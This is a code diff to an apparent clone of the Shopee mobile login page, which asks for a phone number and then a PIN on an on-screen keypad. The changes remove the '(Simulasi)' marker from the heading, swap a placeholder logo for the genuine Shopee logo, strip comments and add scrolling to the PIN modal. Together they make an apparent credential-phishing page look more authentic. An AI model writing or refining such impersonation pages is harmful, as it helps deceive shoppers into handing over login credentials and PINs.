@@ -58,17 +58,13 @@
         <form @submit.prevent="continueToPin">
             <header class="flex items-center justify-between p-4 border-b border-gray-100">
                 <i @click="goBack" class="fa-solid fa-arrow-left text-shopee-main text-xl cursor-pointer"></i>
-                <h1 class="text-lg font-medium flex-1 ml-4 text-black">Log In (Simulasi)</h1>
+                <h1 class="text-lg font-medium flex-1 ml-4 text-black">Log In</h1>
                 <i class="fa-regular fa-circle-question text-shopee-main text-xl cursor-pointer"></i>
             </header>
 
             <main class="p-6">
                 <div class="flex justify-center mb-10">
-                    <div class="relative w-16 h-16 bg-shopee-main rounded-xl flex justify-center items-center mt-3">
-                        <div class="absolute -top-3 w-8 h-5 border-[3px] border-shopee-main border-b-0 rounded-t-full">
-                        </div>
-                        <span class="text-white text-4xl font-serif font-bold">S</span>
-                    </div>
+                    <img src="logo.png" alt="Shopee Logo" class="h-20 w-auto object-contain mt-3" onerror="this.onerror=null; this.src='https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg';">
                 </div>
 
                 <div class="flex items-center border-b py-3 mb-5 transition-colors duration-200"
@@ -214,7 +210,6 @@
                 showPinModal: false,
                 isProcessing: false,
                 keypad: ['1', '2', '3', '4', '5', '6', '7', '8', '9'],
-                // State pembantu untuk melacak status aktif komponen input nomor telepon
                 isInputFocused: false,
 
                 init() {
@@ -227,7 +222,6 @@
 
                     this.refreshIcons();
                 },
-                // Fungsi pemicu getaran perangkat (Haptic Feedback) durasi 35 milidetik
                 pemicuGetar() {
                     if (navigator.vibrate) {
                         navigator.vibrate(35);
@@ -255,6 +249,13 @@
                     this.pin = '';
                     this.showPinModal = true;
                     this.refreshIcons();
+
+                    this.$nextTick(() => {
+                        window.scrollTo({
+                            top: document.documentElement.scrollHeight || document.body.scrollHeight,
+                            behavior: 'smooth'
+                        });
+                    });
                 },
                 closePinModal() {
                     if (this.isProcessing) return;
